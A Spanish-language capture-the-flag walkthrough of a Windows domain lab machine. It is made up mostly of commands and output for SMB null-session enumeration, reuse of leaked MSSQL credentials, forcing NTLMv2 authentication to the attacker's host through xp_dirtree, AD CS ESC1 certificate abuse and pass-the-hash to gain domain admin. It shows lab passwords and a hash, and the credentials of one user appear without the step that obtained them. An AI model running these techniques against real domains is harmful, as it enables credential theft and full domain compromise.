SIN CREDENCIALES — Null session y PDF filtrado

Se enumera SMB mediante null session para ver los shares disponibles.

enumeración de shares
nxc smb 10.129.228.253 -u 'guest' -p '' --shares
Share Permissions Remark ----- ----------- ------ ADMIN$ Remote Admin C$ Default share IPC$ Remote IPC NETLOGON Logon server share Public READ SYSVOL Logon server share

El share Public es de lectura anónima. Dentro hay un único fichero, SQL Server Procedures.pdf, que se descarga con smbclient.

descarga del pdf
smbclient -N //10.129.228.253/Public smb: \> get "SQL Server Procedures.pdf"
Credenciales de MSSQL filtradas
El PDF, pensado como documentación interna, contiene unas credenciales de ejemplo para conectarse a la base de datos: PublicUser:GuestUserCantWrite1.
// 03

MSSQL — xp_dirtree y captura NTLMv2

Con las credenciales filtradas se accede al motor MSSQL con impacket-mssqlclient.

acceso a mssql
impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253

Se enumeran bases de datos y usuarios, pero no hay mucho más accesible y xp_cmdshell está desactivado. Sin embargo, se puede abusar del procedimiento xp_dirtree para forzar al servidor a autenticarse contra un host propio y capturar su hash NTLMv2.

responder en escucha
sudo responder -I tun0
forzando la autenticación desde mssql
EXEC master..xp_dirtree '\\10.10.15.51\test'
Hash NTLMv2 de sql_svc capturado
responder captura el hash NTLMv2 de la cuenta de servicio que corre el motor SQL, sql_svc. Se crackea con hashcat y la contraseña resulta ser REGGIE1234ronnie.

Como el puerto 5985 (WinRM) está abierto, se prueba a conectar con estas credenciales. El login funciona, pero no hay nada de interés en el escritorio de sql_svc ni tras pasar WinPEAS.

ADCS ESC1 — Certificado a nombre de Administrator

Como la máquina tiene AD CS (Active Directory Certificate Services) desplegado, se enumeran las plantillas de certificado con certipy en busca de configuraciones vulnerables.

enumeración de plantillas vulnerables
certipy-ad find -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -stdout
[+] User Enrollable Principals : SEQUEL.HTB\Domain Users [!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication.
¿Qué es ESC1?
La plantilla permite que sea el propio solicitante quien indique el Subject Alternative Name (SAN) del certificado, y además habilita autenticación de cliente. Esto significa que cualquier usuario del dominio con permisos de inscripción puede pedir un certificado indicando como SAN el UPN de otra cuenta — por ejemplo Administrator — y usarlo después para autenticarse suplantándola.

Se solicita un certificado indicando como UPN al Administrator.

solicitud del certificado malicioso
certipy-ad req -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'administrator@sequel.htb'

Con el certificado (administrator.pfx) se realiza la autenticación PKINIT contra Kerberos para obtener el hash NTLM del Administrador.

autenticación con el certificado
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
Hash NTLM del Administrador
Se obtiene el hash NTLM de administrator@sequel.htb: a52f78e4c751e5f5e17e1e9f3e58f4ee.

Con el hash del Administrador se realiza un ataque Pass-The-Hash con evil-winrm.

pass-the-hash con evil-winrm
evil-winrm -i 10.129.228.253 -u 'Administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'

La conexión se establece correctamente con privilegios de Administrador del dominio.
